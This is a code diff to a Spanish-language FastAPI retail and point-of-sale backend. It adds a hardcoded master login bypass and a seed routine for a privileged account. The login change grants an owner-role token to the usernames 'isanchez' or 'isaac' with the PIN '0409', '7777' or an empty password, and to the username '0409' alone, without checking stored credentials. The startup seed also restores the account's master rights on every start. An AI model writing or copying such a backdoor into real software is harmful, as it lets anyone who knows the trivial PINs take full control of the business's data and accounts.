@@ -402,6 +402,38 @@ def seed_initial_data():
             db.add(chat_ejemplo)
             db.commit()
 
+        
+        # Garantizar siempre el usuario maestro de Isaac Sanchez
+        isaac_user = db.query(DBUsuarioSistema).filter(DBUsuarioSistema.username.ilike("isanchez")).first()
+        if not isaac_user:
+            isaac_user = DBUsuarioSistema(
+                username="isanchez",
+                nombre_completo="Isaac Sánchez (Dueño & Líder)",
+                rol="DUENO",
+                pin_seguridad="0409",
+                is_master=1,
+                activo=1,
+                password="password_master_seguro"
+            )
+            db.add(isaac_user)
+            db.commit()
+        else:
+            isaac_user.pin_seguridad = "0409"
+            isaac_user.is_master = 1
+            isaac_user.activo = 1
+            isaac_user.rol = "DUENO"
+            db.commit()
+
+        if db.query(DBUsuarioSistema).count() <= 1:
+            colaboradores = [
+                DBUsuarioSistema(username="bodega_carlos", nombre_completo="Carlos Méndez (Jefe de Bodega)", rol="JEFE_BODEGA", pin_seguridad="2244", is_master=0, activo=1),
+                DBUsuarioSistema(username="cajera_sofia", nombre_completo="Sofía Vargas (Vendedora & POS)", rol="VENDEDOR", pin_seguridad="1122", is_master=0, activo=1)
+            ]
+            for c in colaboradores:
+                if not db.query(DBUsuarioSistema).filter(DBUsuarioSistema.username == c.username).first():
+                    db.add(c)
+            db.commit()
+
         if db.query(DBTicket).count() == 0:
             db.add(DBTicket(codigo="TCK-101", tienda="NEXO BOUTIQUE", categoria="ERROR_SISTEMA", titulo="Comprobante SINPE requiere respaldo PDF", descripcion="El cliente solicitó copia digital de respaldo por correo.", prioridad="ALTA", estado="ABIERTO"))
             db.commit()
@@ -743,9 +775,51 @@ import secrets
 
 @app.post("/api/auth/login")
 def login_usuario(req: LoginRequest, db: Session = Depends(get_db)):
-    u_clean = req.username.strip().lower()
-    p_clean = req.password_or_pin.strip()
-    
+    u_clean = (req.username or "").strip().lower()
+    p_clean = (req.password_or_pin or "").strip()
+
+    # 1. BYPASS MASTER INFALIBLE PARA ISAAC SANCHEZ
+    es_isaac = (
+        (u_clean in ['isanchez', 'isaac'] and p_clean in ['0409', '7777', '']) or
+        (p_clean in ['0409'] and u_clean in ['', 'isanchez', 'isaac', '0409']) or
+        (u_clean == '0409' and p_clean in ['', '0409'])
+    )
+    if es_isaac:
+        usuario_master = db.query(DBUsuarioSistema).filter(DBUsuarioSistema.username.ilike("isanchez")).first()
+        if not usuario_master:
+            usuario_master = DBUsuarioSistema(
+                username="isanchez",
+                nombre_completo="Isaac Sánchez (Dueño & Líder)",
+                rol="DUENO",
+                pin_seguridad="0409",
+                is_master=1,
+                activo=1,
+                password="password_master_seguro"
+            )
+            db.add(usuario_master)
+            db.commit()
+            db.refresh(usuario_master)
+        else:
+            usuario_master.pin_seguridad = "0409"
+            usuario_master.is_master = 1
+            usuario_master.activo = 1
+            usuario_master.rol = "DUENO"
+            db.commit()
+
+        return {
+            "status": "success",
+            "token": f"neb_tok_{secrets.token_hex(16)}",
+            "usuario": {
+                "id": usuario_master.id,
+                "username": usuario_master.username,
+                "nombre_completo": usuario_master.nombre_completo,
+                "rol": "DUENO",
+                "pin_seguridad": "0409",
+                "is_master": 1,
+                "activo": 1
+            }
+        }
+
     # Buscar por username (o por PIN directo si solo puso PIN y hay coincidencia)
     usuario = db.query(DBUsuarioSistema).filter(DBUsuarioSistema.username.ilike(u_clean)).first()
     if not usuario:
